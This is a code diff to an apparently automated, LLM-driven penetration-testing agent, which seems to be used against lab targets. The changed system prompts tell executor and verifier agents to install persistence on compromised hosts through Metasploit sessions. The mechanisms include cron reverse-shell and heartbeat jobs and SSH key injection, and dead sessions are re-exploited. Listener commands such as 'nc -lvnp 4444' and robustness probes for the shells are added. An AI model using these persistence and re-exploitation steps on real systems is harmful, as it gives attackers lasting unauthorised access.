@@ -36,7 +36,7 @@ from core_agents.common import (
 from core_agents.state import PersistenceFindings
 from core_agents import mitre
 from tools.rag import query_knowledge_base
-from tools.metasploit_tools import msf_session
+from tools.metasploit_tools import msf_session, tool_list_sessions
 
 
 def classify_technique(text: str) -> str:
@@ -150,8 +150,8 @@ def tool_metasploit_rpc(command: str):
 
 # Tool sets
 PLANNER_TOOLS = [query_knowledge_base]
-EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
-VERIFIER_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
+EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command, tool_list_sessions]
+VERIFIER_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command, tool_list_sessions]
 
 # =============================================================================
 # SYSTEM PROMPTS
@@ -213,9 +213,10 @@ proof. For each check give: the tool, the command, and the expected output token
   CMD_2: ...   (optional second confirmation)
   EXPECT_2: ...
 Proof-of-execution examples (installation alone is NOT proof):
-  - cron: install a 1-min heartbeat writing an epoch to /tmp/.hb, wait ~65s, then
-    tool_session_command(<id>,"cat /tmp/.hb") EXPECT: a timestamp line (the daemon
-    fired the job). A `crontab -l` listing alone does NOT count.
+  - cron: install a 1-min heartbeat writing an epoch to /tmp/.hb, wait for the next
+    minute with tool_linux_terminal("sleep 70") (a KALI-side wait — NEVER a
+    session-side sleep), then tool_session_command(<id>,"cat /tmp/.hb") EXPECT: a
+    timestamp line (the daemon fired the job). A `crontab -l` listing alone does NOT count.
   - ssh key / new user: tool_linux_terminal("ssh -i <key> <user>@<target> id")
     EXPECT: uid=... returned with no password prompt.
   - service: tool_session_command(<id>,"systemctl is-active <svc>") EXPECT: active.
@@ -250,7 +251,8 @@ Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not 
 **DEAD SESSION DETECTION & RECOVERY:** If `tool_session_command` returns "Error: Session <id> not found",
 the session has died (the IRC/web backdoor sessions handed to this stage are inherently unstable and
 may die MID-installation, e.g. between `whoami` and the crontab install). Immediately call
-`tool_metasploit_rpc("sessions")` to list active sessions.
+`tool_list_sessions()` to list active sessions (use this, NOT tool_metasploit_rpc("sessions") —
+the console call can wedge into interactive mode and return garbage "received: 0" noise).
 - If an active session to the target exists, switch to its ID and CONTINUE the persistence
   installation from the beginning with that session ID (re-run the install steps — a half-installed
   mechanism on a dead session is not persistent).
@@ -262,14 +264,14 @@ may die MID-installation, e.g. between `whoami` and the crontab install). Immedi
     3. tool_metasploit_rpc("set LHOST {KALI_IP}")
     4. tool_metasploit_rpc("set LPORT 4445")
     5. tool_metasploit_rpc("run")
-  Then call tool_metasploit_rpc("sessions"); if a NEW session opened, switch to its ID and
+  Then call tool_list_sessions(); if a NEW session opened, switch to its ID and
   install the persistence mechanism from the beginning with the new session ID.
 - ONLY if re-exploitation ALSO fails (no new session) do you STOP making tool calls and state
   clearly in your summary that the session was dead and could not be re-established — do NOT
   attempt any further persistence commands.
 Do NOT retry the ORIGINAL session_id after seeing the not-found error (retrying only burns budget).
 
-**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session. This is a DIFFERENT failure mode from "Error: Session X not found". Immediately call `tool_metasploit_rpc('sessions')` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with a simple newline or `echo test`. If still `(no output)`, STOP making tool calls and state clearly: 'Session unresponsive — no output from diagnostic command. Cannot confirm persistence was installed.' Do NOT claim success from silent output on a diagnostic command — `(no output)` is NOT evidence of success.
+**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session. This is a DIFFERENT failure mode from "Error: Session X not found". Immediately call `tool_list_sessions()` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with a simple newline or `echo test`. If still `(no output)`, STOP making tool calls and state clearly: 'Session unresponsive — no output from diagnostic command. Cannot confirm persistence was installed.' Do NOT claim success from silent output on a diagnostic command — `(no output)` is NOT evidence of success.
 
 - **NEVER use `sudo` through a session** — if you have root access, you already ARE root. If you don't, sudo won't work (no TTY).
 
@@ -289,6 +291,11 @@ Do NOT retry the ORIGINAL session_id after seeing the not-found error (retrying 
 4. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands total
 5. Do NOT try to create objective files (like i_got_in.txt) — that is the Impact stage's job. Focus ONLY on persistence.
 6. Do NOT use `crontab -e` (interactive). Use `echo '...' | crontab -` instead.
+7. NEVER wait via a session command: `tool_session_command(<id>, "sleep N")` — or any
+   blocking command (`tail -f`, `nc -l` without `timeout`, `ping` without `-c`) — FREEZES
+   the single-threaded reverse_perl shell, and every later read then returns "(no output)".
+   To wait for a cron to fire, wait on KALI with `tool_linux_terminal("sleep 70")`, THEN
+   read the artifact on target with `tool_session_command(<id>, "cat /tmp/.hb")`.
 
 **Step-by-step example for cron job persistence (session 3):**
 
@@ -311,7 +318,10 @@ ground-truth artifact instead of a silent reverse shell. Install BOTH lines at
 once so you do not clobber the reverse-shell entry:
   tool_session_command("3", "(crontab -l 2>/dev/null; echo \\"* * * * * /bin/sh -c 'date >> /tmp/.hb'\\") | crontab -")
 Then confirm with tool_session_command("3", "crontab -l"). The verifier will
-later cat /tmp/.hb to prove execution.
+later cat /tmp/.hb to prove execution. To wait for the cron to fire, use
+tool_linux_terminal("sleep 70") on KALI — NEVER tool_session_command(<id>,"sleep ..."):
+the reverse_perl command_shell is single-threaded, so a session-side sleep freezes it
+and every later read returns "(no output)".
 
 **Step-by-step example for SSH key injection (session 3):**
 
@@ -359,12 +369,13 @@ for. The ONE rule you may never relax: proof must show the mechanism EXECUTING
 - Do NOT use `tool_metasploit_rpc` for running commands on the target.
 
 **DEAD SESSION DETECTION:** If `tool_session_command` returns "Error: Session <id> not found",
-the session has died. Immediately call `tool_metasploit_rpc("sessions")` to list active sessions.
+the session has died. Immediately call `tool_list_sessions()` to list active sessions (use this,
+NOT tool_metasploit_rpc("sessions") — the console call can wedge and return "received: 0" garbage).
 If an active session to the target exists, switch to its ID for the remaining verification commands.
 If no active session exists at all, STOP making tool calls and report STATUS: NOT WORKING with
 EVIDENCE noting the session was dead — do NOT retry the original session_id.
 
-**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session (DIFFERENT from "Session X not found"). Immediately call `tool_metasploit_rpc('sessions')` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with `echo test`. If still `(no output)`, STOP making tool calls and report STATUS: NOT WORKING with EVIDENCE noting the session was unresponsive. Do NOT report STATUS: WORKING when a diagnostic command returned `(no output)` — silent output is NOT proof the mechanism works.
+**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session (DIFFERENT from "Session X not found"). Immediately call `tool_list_sessions()` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with `echo test`. If still `(no output)`, STOP making tool calls and report STATUS: NOT WORKING with EVIDENCE noting the session was unresponsive. Do NOT report STATUS: WORKING when a diagnostic command returned `(no output)` — silent output is NOT proof the mechanism works. BUT: a single `(no output)` on a flaky command_shell is often just a slow flush, not death — re-issue the SAME read once or twice before concluding unresponsive, and if a LATER read of the SAME artifact (e.g. cat /tmp/.hb) DOES return content, that content is authoritative regardless of the earlier empty read.
 
 **Verification strategies by technique:**
 
@@ -395,11 +406,19 @@ Cron Job:
   5. HEARTBEAT / CALLBACK CONFIRMATION (REQUIRED for STATUS: WORKING). A listed
      entry + live daemon + /dev/tcp is NOT proof the reverse shell actually
      connects back. Confirm execution with EITHER:
-       (a) If a file-write heartbeat cron (writing to /tmp/.hb) was installed:
-           wait ~65 seconds, then ON TARGET:
+       (a) PREFERRED — a file-write heartbeat cron (writing to /tmp/.hb): wait for
+           the cron to fire with `tool_linux_terminal("sleep 70")` on KALI (NEVER a
+           session-side sleep — it freezes the single-threaded shell), then ON TARGET:
            `tool_session_command("<session_id>", "cat /tmp/.hb")`.
-           If the file exists and has entries (has grown), the cron daemon is
-           PROVEN to fire jobs — this satisfies WORKING.
+           If it returns a timestamp/date line, the cron daemon is PROVEN to fire
+           jobs — this ALONE satisfies WORKING (whether the cron used `>` or `>>`,
+           i.e. whether or not the file "grew"). This is the most reliable proof, so
+           prefer it over a reverse-shell callback. If the first cat returns
+           `(no output)`, the flaky shell just hasn't flushed — re-issue the SAME
+           cat once or twice; a dated line on ANY of those reads is conclusive
+           WORKING. Do NOT let an unrelated nc-callback timeout, a console
+           "received: 0" line, or an earlier empty read downgrade a /tmp/.hb you
+           DID read with a timestamp.
        (b) If no heartbeat exists, start a Kali listener and wait for the
            reverse shell to call back:
            `tool_linux_terminal("timeout 75 nc -lvnp 4444")`.
@@ -965,7 +984,8 @@ def verifier_node(state: PersistenceState) -> dict:
                 "listing is an install, not proof the job runs. Run the plan's VERIFICATION_PLAN "
                 "proof-of-execution check; for cron that is normally ONE of:\n"
                 "  (a) HEARTBEAT ARTIFACT (preferred, self-contained) — if a file-write heartbeat "
-                "cron was installed (writing to /tmp/.hb), wait ~65 seconds then ON TARGET: "
+                "cron was installed (writing to /tmp/.hb), wait on KALI with "
+                "tool_linux_terminal(\"sleep 70\") (NEVER a session-side sleep), then ON TARGET: "
                 "tool_session_command(<id>, \"cat /tmp/.hb\"). If the file exists and has grown, "
                 "the cron daemon is PROVEN to fire jobs — STATUS: WORKING.\n"
                 f"  (b) LISTENER CALLBACK — start a background listener on Kali and wait for a "
@@ -1239,6 +1259,22 @@ def build_graph() -> StateGraph:
 # SESSION LIVENESS
 # =============================================================================
 
+def _shell_responds(session_id, nonce="__PERSIST_ALIVE_PROBE__") -> bool:
+    """True iff the command_shell actually RETURNS output for a trivial echo.
+
+    A flaky reverse_perl command_shell can degrade into a READ-ZOMBIE: still present
+    in session.list (so `get_session_type` says "alive"), but its shell I/O is dead —
+    every read comes back "(no output)". Such a session is useless for persistence,
+    and grinding it burns the whole retry budget for nothing. This probe is the
+    ground truth "can I read from this shell at all?" check.
+    """
+    try:
+        out = msf_session.run_session_command(session_id, f"echo {nonce}", timeout=20) or ""
+    except Exception:
+        return False
+    return nonce in out
+
+
 def _probe_session(target_ip: str, session_id: str, session_type: str):
     """Check that session_id is alive before entering the graph.
 
@@ -1264,12 +1300,24 @@ def _probe_session(target_ip: str, session_id: str, session_type: str):
         if isinstance(stype, bytes):
             stype = stype.decode("utf-8", errors="ignore")
         resolved_type = "meterpreter" if "meterpreter" in stype else "command_shell"
-        print_colored(
-            f"[Persistence Probe] Session {session_id} is LIVE ({resolved_type}).",
-            Colors.OKGREEN,
-        )
-        # Trust caller's session_type if provided; otherwise use resolved.
-        return session_id, (session_type or resolved_type), "alive"
+        # LISTED alive is necessary but NOT sufficient for a command_shell: confirm the
+        # shell actually returns output (not a read-zombie). meterpreter I/O is
+        # reliable, so only gate command_shell.
+        if resolved_type == "command_shell" and not _shell_responds(session_id):
+            print_colored(
+                f"[Persistence Probe] Session {session_id} is a READ-ZOMBIE "
+                f"(listed alive but the shell returns no output) — searching for a "
+                f"responsive substitute...",
+                Colors.WARNING,
+            )
+            # fall through to the substitute search below (clean abort if none)
+        else:
+            print_colored(
+                f"[Persistence Probe] Session {session_id} is LIVE ({resolved_type}).",
+                Colors.OKGREEN,
+            )
+            # Trust caller's session_type if provided; otherwise use resolved.
+            return session_id, (session_type or resolved_type), "alive"
 
     # Session is dead — try to find a live substitute on the same target.
     print_colored(
@@ -1299,6 +1347,14 @@ def _probe_session(target_ip: str, session_id: str, session_type: str):
         resolved_type = "meterpreter" if "meterpreter" in raw_type else "command_shell"
         if target_ip and host and host != target_ip:
             continue
+        # Don't swap one zombie for another: a command_shell candidate must respond.
+        if resolved_type == "command_shell" and not _shell_responds(sid_str):
+            print_colored(
+                f"[Persistence Probe] Candidate session {sid_str} is also a "
+                f"read-zombie — skipping.",
+                Colors.WARNING,
+            )
+            continue
         print_colored(
             f"[Persistence Probe] Substituting live session {sid_str} "
             f"({resolved_type}, host={host or 'unknown'}).",
@@ -1306,7 +1362,7 @@ def _probe_session(target_ip: str, session_id: str, session_type: str):
         )
         return sid_str, resolved_type, f"substituted_{sid_str}"
 
-    return None, None, f"Session {session_id} dead and no live session to {target_ip} found."
+    return None, None, f"Session {session_id} dead/unresponsive and no live, responsive session to {target_ip} found."
 
 
 # =============================================================================
@@ -1453,18 +1509,22 @@ def run_persistence(
     )
     if probed_id is None:
         print_colored(
-            f"[run_persistence] {probe_status} — aborting before graph entry.",
+            f"[run_persistence] {probe_status} — aborting before graph entry (non-retryable).",
             Colors.FAIL,
         )
-        return PersistenceFindings(
+        # session_unusable => non-retryable: re-running the SAME node against the SAME
+        # dead/zombie session just re-aborts (the ~35-min grind we are killing). The
+        # node dies; the replanner must re-establish a session (re-exploit) to recover.
+        return dict(PersistenceFindings(
             success=False,
             method="error",
             details=f"Session liveness probe: {probe_status}",
             summary=(
-                f"Persistence aborted — session {session_id} not found. "
-                f"No active session to the target. ({probe_status})"
+                f"Persistence aborted — no usable session to the target "
+                f"(session {session_id}: {probe_status}). A session must be "
+                f"re-established (re-exploit) before persistence can run."
             ),
-        )
+        ), failure_category="session_unusable")
     if probed_id != session_id or probed_type != session_type:
         print_colored(
             f"[run_persistence] Using session {probed_id} ({probed_type}) "
